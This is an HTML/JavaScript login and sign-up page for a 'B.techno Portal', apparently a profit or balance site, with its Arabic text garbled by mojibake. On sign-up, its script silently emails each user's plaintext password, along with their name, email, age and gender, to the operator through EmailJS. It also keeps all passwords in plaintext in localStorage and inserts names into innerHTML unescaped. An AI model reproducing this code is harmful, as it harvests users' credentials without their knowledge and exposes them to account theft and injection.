<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>B.techno Portal - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>

<style>
*{box-sizing:border-box;font-family:'Cairo',sans-serif;margin:0;padding:0;}
body{
  margin:0;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:url("https://images.unsplash.com/photo-1518770660439-4636190af475") no-repeat center fixed;
  background-size:cover;
  position:relative;
  overflow:hidden;
  color:#fff;
}

.bg{
  position:absolute;
  inset:0;
  background:
    linear-gradient(rgba(2,6,23,0.75),rgba(2,6,23,0.85)),
    url("https://images.unsplash.com/photo-1518770660439-4636190af475");
  background-size:cover;
  background-position:center;
  z-index:-2;
  animation:floatBg 20s infinite alternate ease-in-out;
}

@keyframes floatBg{
  from{transform:scale(1) translateY(0);}
  to{transform:scale(1.1) translateY(-20px);}
}

.card{
  background:rgba(2,6,23,0.85);
  padding:30px 25px;
  border-radius:22px;
  width:100%;
  max-width:420px;
  text-align:center;
  box-shadow:0 0 60px rgba(168,85,247,0.6);
  animation:floatCard 4s infinite ease-in-out;
  position:relative;
}

@keyframes floatCard{
  0%,100%{transform:translateY(0);}
  50%{transform:translateY(-12px);}
}

.logo{
  font-size:34px;
  font-weight:800;
  background:linear-gradient(135deg,#38bdf8,#facc15,#a855f7);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  margin-bottom:10px;
  text-shadow:0 0 25px rgba(168,85,247,0.8);
}

input{
  width:100%;
  padding:14px;
  margin:10px 0;
  border-radius:12px;
  border:none;
  background:#020617;
  color:white;
  font-size:15px;
  box-shadow:inset 0 0 12px rgba(168,85,247,0.4);
}

button{
  width:100%;
  padding:14px;
  margin-top:15px;
  border:none;
  border-radius:12px;
  background:linear-gradient(135deg,#facc15,#38bdf8);
  color:#020617;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
  transition:0.3s;
}
button:hover{
  transform:scale(1.07);
  box-shadow:0 0 30px rgba(250,204,21,0.9);
}

.toggle-form{
  margin-top:12px;
  font-size:14px;
  color:#facc15;
  cursor:pointer;
}

.spark{
  position:fixed;
  width:6px;
  height:6px;
  background:radial-gradient(circle,#facc15,#a855f7);
  border-radius:50%;
  pointer-events:none;
  animation:fade 1s forwards;
}
@keyframes fade{
  to{opacity:0; transform:scale(2);}
}

.toast{
  position:fixed;
  top:30px;
  left:50%;
  transform:translateX(-50%);
  background:linear-gradient(135deg,#ff5252,#ff1744);
  color:#fff;
  padding:12px 20px;
  border-radius:25px;
  font-weight:bold;
  box-shadow:0 8px 25px rgba(0,0,0,0.4);
  opacity:0;
  pointer-events:none;
  transition:0.5s;
  z-index:9999;
}
.toast.show{opacity:1;}
</style>
</head>

<body>
<div class="bg"></div>

<div class="card" id="authCard">
  <div class="logo">B.techno</div>
  <p id="formTitle">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ</p>

  <form id="authForm">
    <input type="text" id="name" placeholder="Ø§Ù„Ø§Ø³Ù…" style="display:none;">
    <input type="text" id="gender" placeholder="Ø§Ù„Ù†ÙˆØ¹" style="display:none;">
    <input type="number" id="age" placeholder="Ø§Ù„Ø³Ù†" style="display:none;">
    <input type="email" id="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
    <input type="password" id="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
    <button type="submit" id="submitBtn">Ø¯Ø®ÙˆÙ„</button>
  </form>

  <div class="toggle-form" id="toggleForm">Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</div>
</div>

<div id="toast" class="toast"></div>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init("3pBE5P5gfa6PPk2Wu");
</script>

<script>
const authForm = document.getElementById("authForm");
const toggleForm = document.getElementById("toggleForm");
const formTitle = document.getElementById("formTitle");
const submitBtn = document.getElementById("submitBtn");
const toast = document.getElementById("toast");

const nameInput = document.getElementById("name");
const genderInput = document.getElementById("gender");
const ageInput = document.getElementById("age");

let isSignUp = false;
let accounts = JSON.parse(localStorage.getItem("accounts")) || [];

// Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„
function sendAuthEmail(type, name, email, gender="", age="", password=""){
  emailjs.send(
    "service_al1b7s2",
    "template_4a7un8j",
    {
      to_name: name,
      to_email: email, // Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ø´Ø§Ù† ÙŠØ¸Ù‡Ø± ÙÙŠ Content
      action: type === "signup" ? "Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯" : "ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„",
      message: type === "signup"
        ? `ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯
Ø§Ù„Ø§Ø³Ù…: ${name}
Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: ${email}
Ø§Ù„Ù†ÙˆØ¹: ${gender}
Ø§Ù„Ø³Ù†: ${age}
ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${password}`
        : `ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„
Ø§Ù„Ø§Ø³Ù…: ${name}
Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: ${email}
Ø§Ù„Ù†ÙˆØ¹: ${gender}
Ø§Ù„Ø³Ù†: ${age}`
    }
  ).then(
    ()=>console.log("âœ… Email Sent"),
    err=>console.error("âŒ Email Error", err)
  );
}




// spark effect
document.addEventListener("mousemove", e=>{
  const s=document.createElement("div");
  s.className="spark";
  s.style.left=e.clientX+"px";
  s.style.top=e.clientY+"px";
  document.body.appendChild(s);
  setTimeout(()=>s.remove(),1000);
});

// toast function
function showToast(msg){
  toast.innerText = msg;
  toast.classList.add("show");
  setTimeout(()=>toast.classList.remove("show"),3000);
}

// ØªØ¨Ø¯ÙŠÙ„ Ø¨ÙŠÙ† ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ / Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨
toggleForm.addEventListener("click", ()=>{
  isSignUp = !isSignUp;
  if(isSignUp){
    formTitle.innerText = "Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯";
    submitBtn.innerText = "Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨";
    toggleForm.innerText = "Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„";
    nameInput.style.display="block";
    genderInput.style.display="block";
    ageInput.style.display="block";
    nameInput.required = true;
    genderInput.required = true;
    ageInput.required = true;
  }else{
    formTitle.innerText = "ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ";
    submitBtn.innerText = "Ø¯Ø®ÙˆÙ„";
    toggleForm.innerText = "Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨";
    nameInput.style.display="none";
    genderInput.style.display="none";
    ageInput.style.display="none";
    nameInput.required = false;
    genderInput.required = false;
    ageInput.required = false;
  }
});

// Ø¯Ø§Ù„Ø© Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ±Ø­ÙŠØ¨ Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠØ©
function showWelcomeMessage(name, callback){
  const bubble = document.createElement("div");
  bubble.style.position = "fixed";
  bubble.style.top = "50%";
  bubble.style.left = "50%";
  bubble.style.transform = "translate(-50%, -50%)";
  bubble.style.background = "linear-gradient(135deg,#38bdf8,#facc15,#a855f7)";
  bubble.style.padding = "25px 40px";
  bubble.style.borderRadius = "25px";
  bubble.style.color = "#020617";
  bubble.style.fontSize = "22px";
  bubble.style.fontWeight = "700";
  bubble.style.boxShadow = "0 0 40px rgba(168,85,247,0.7)";
  bubble.style.zIndex = "9999";
  bubble.style.opacity = "0";
  bubble.style.textAlign = "center";
  bubble.style.transition = "opacity 0.5s, transform 0.5s";
  bubble.innerHTML = `ğŸ‰ Ù…Ø±Ø­Ø¨Ø§Ù‹ <span style="color:#A52A2A
">${name}</span>!<br>ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­`;

  document.body.appendChild(bubble);

  // Ø¸Ù‡ÙˆØ± Ø§Ù„Ø±Ø³Ø§Ù„Ø©
  setTimeout(()=>{
    bubble.style.opacity = "1";
    bubble.style.transform = "translate(-50%, -50%) scale(1.05)";
  },50);

  // Ø§Ø®ØªÙØ§Ø¡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ†
  setTimeout(()=>{
    bubble.style.opacity = "0";
    bubble.style.transform = "translate(-50%, -50%) scale(0.9)";
    setTimeout(()=>{
      bubble.remove();
      callback();
    },500);
  },2000);
}

// Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙÙˆØ±Ù…
authForm.addEventListener("submit", e=>{
  e.preventDefault();
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const name = nameInput.value.trim();
  const gender = genderInput.value.trim();
  const age = ageInput.value.trim();

 if(isSignUp){
  if(accounts.some(acc=>acc.email===email)){
    showToast("Ù‡Ø°Ø§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ù…Ø³Ø¬Ù„ Ø¨Ø§Ù„ÙØ¹Ù„ âŒ");
    return;
  }

  accounts.push({
  name,
  gender,
  age,
  email,
  password,
  balance: 0,
  totalProfit: 0,
  lastDaily: 0
});

  localStorage.setItem("accounts", JSON.stringify(accounts));
  localStorage.setItem("currentUser", JSON.stringify({name,email}));

  // âœ… Ø¥Ø±Ø³Ø§Ù„ Ø¥ÙŠÙ…ÙŠÙ„ Ø¥Ø´Ø¹Ø§Ø± Ø¹Ù„Ù‰ btechno1010@gmail.com
  sendAuthEmail("signup", name, email, gender, age, password);


  showWelcomeMessage(name, ()=>{
    window.location.href="Btechno2.html";
  });

}else{
  const user = accounts.find(acc=>acc.email===email);
  if(!user){ showToast("Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ âŒ"); return; }
  if(user.password!==password){ showToast("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø®Ø§Ø·Ø¦Ø© âŒ"); return; }

  localStorage.setItem(
  "currentUser",
  JSON.stringify({ email: user.email })
);


  // âœ… Ø¥Ø±Ø³Ø§Ù„ Ø¥ÙŠÙ…ÙŠÙ„ Ø¥Ø´Ø¹Ø§Ø± Ø¹Ù„Ù‰ btechno1010@gmail.com
  sendAuthEmail("login", user.name, user.email, user.gender, user.age, user.password);


  showWelcomeMessage(user.name, ()=>{
    window.location.href="Btechno2.html";
  });
}

});
</script>
</body>
</html>